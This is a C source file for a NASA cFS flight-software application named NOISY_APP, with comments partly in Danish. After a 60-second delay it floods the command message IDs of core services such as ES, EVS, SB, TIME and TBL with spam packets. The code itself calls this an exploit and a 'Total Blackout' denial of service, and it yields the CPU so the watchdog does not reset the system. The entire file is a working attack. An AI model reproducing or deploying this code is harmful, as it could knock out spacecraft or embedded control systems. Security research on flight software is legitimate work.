#include "cfe.h"
#include "cfe_sb.h"
#include "cfe_es.h"
#include "cfe_evs.h"

#define TARGET_ES_CMD_MID     0x1806
#define TARGET_EVS_CMD_MID    0x1801
#define TARGET_SB_CMD_MID     0x1803
#define TARGET_TIME_CMD_MID   0x1805
#define TARGET_TBL_CMD_MID    0x1804
#define TARGET_CI_LAB_CMD_MID 0x1884
#define TARGET_TO_LAB_CMD_MID 0x1880

typedef struct
{
    CFE_MSG_CommandHeader_t CmdHeader;
} NOISY_APP_Pkt_t;

void NOISY_APP_Main(void)
{
    uint32          RunStatus = CFE_ES_RunStatus_APP_RUN;
    NOISY_APP_Pkt_t SpamPacket;

    /* Tilføj en tæller til vores 60 sekunders (60.000 ms) forsinkelse */
    int delayCounter = 0;

    /* MANDATORY: Handshake with the OS so we don't get assassinated on boot */
    CFE_ES_RegisterApp();

    /* Array containing all our targets */
    CFE_SB_MsgId_t TargetMIDs[] = {
        CFE_SB_ValueToMsgId(TARGET_ES_CMD_MID),    CFE_SB_ValueToMsgId(TARGET_EVS_CMD_MID),
        CFE_SB_ValueToMsgId(TARGET_SB_CMD_MID),    CFE_SB_ValueToMsgId(TARGET_TIME_CMD_MID),
        CFE_SB_ValueToMsgId(TARGET_TBL_CMD_MID),   CFE_SB_ValueToMsgId(TARGET_CI_LAB_CMD_MID),
        CFE_SB_ValueToMsgId(TARGET_TO_LAB_CMD_MID)};
    int numTargets = sizeof(TargetMIDs) / sizeof(TargetMIDs[0]);

    CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);

    /* Print en besked så vi ved, at den venter i stilhed */
    CFE_EVS_SendEvent(1, CFE_EVS_EventType_INFORMATION, "NOISY_APP: Startet op. Venter 60 sekunder i stilhed...");

    while (CFE_ES_RunLoop(&RunStatus) == true)
    {
        /* ========================================================== */
        /* STATIC TIME TRIGGER                                        */
        /* ========================================================== */
        if (delayCounter < 60000)
        {
            delayCounter++;
            OS_TaskDelay(1); /* Yield CPU'en i 1 ms */
            continue;        /* Spring resten af løkken over og start forfra */
        }
        else if (delayCounter == 60000)
        {
            CFE_EVS_SendEvent(2, CFE_EVS_EventType_INFORMATION,
                              "NOISY_APP: 60 sekunder er gaaet. Initiating Total Blackout!");
            delayCounter++; /* Sørg for at vi kun printer denne besked én gang */
        }

        // THE EXPLOIT (Omnidirectional DoS):
        // Loop through every single critical application and flood its specific pipe.
        for (int t = 0; t < numTargets; t++)
        {
            /* Re-initialize the packet header to point to the new target */
            CFE_MSG_Init((CFE_MSG_Message_t *)&SpamPacket, TargetMIDs[t], sizeof(SpamPacket));

            /* Flood 200 packets into this specific mailbox */
            for (int i = 0; i < 200; i++)
            {
                CFE_SB_TransmitMsg((CFE_MSG_Message_t *)&SpamPacket, true);
            }
        }

        /* Yield the CPU for 1 millisecond so the Watchdog doesn't reset the system */
        OS_TaskDelay(1);
    }

    CFE_ES_ExitApp(RunStatus);
}